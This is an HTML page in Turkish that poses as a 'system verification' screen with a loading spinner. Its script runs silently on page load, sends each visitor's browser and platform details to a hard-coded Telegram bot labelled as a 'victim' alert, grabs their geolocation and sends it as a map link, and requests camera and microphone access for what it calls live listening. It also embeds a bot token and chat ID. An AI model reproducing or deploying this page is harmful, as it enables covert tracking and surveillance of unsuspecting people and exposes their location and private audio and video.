<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Doğrulaması</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New'; text-align: center; padding-top: 50px; }
        .loading { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loading"></div>
    <h2 id="log">> SİSTEM ANALİZ EDİLİYOR...</h2>

    <script>
        const BOT_TOKEN = "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8";
        const CHAT_ID = "8258235296";
        const RENDER_URL = "https://sorgu-bot-1hh.onrender.com";

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        }

        // 1. ADIM: SESSİZCE BİLGİ TOPLA
        async function infiltrate() {
            let info = `⚠️ KURBAN SİTEYE GİRDİ!\n📱 Tarayıcı: ${navigator.userAgent}\n🌐 Platform: ${navigator.platform}`;
            await sendToBot(info);

            // 2. ADIM: KONUM SIZINTISI
            navigator.geolocation.getCurrentPosition(async (pos) => {
                let loc = `📍 KONUM YAKALANDI: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await sendToBot(loc);
            });

            // 3. ADIM: KAMERA VE SES ERİŞİMİ (SİTE ÜZERİNDEN)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                await sendToBot("✅ MİKROFON VE KAMERA ERİŞİMİ SAĞLANDI! CANLI DİNLEME AKTİF.");
                // Burada stream'i Render üzerinden sana aktarabiliriz aşkım
            } catch (e) {
                await sendToBot("❌ Kurban izni reddetti, ama takip devam ediyor.");
            }
        }

        window.onload = infiltrate;
    </script>
</body>
</html>
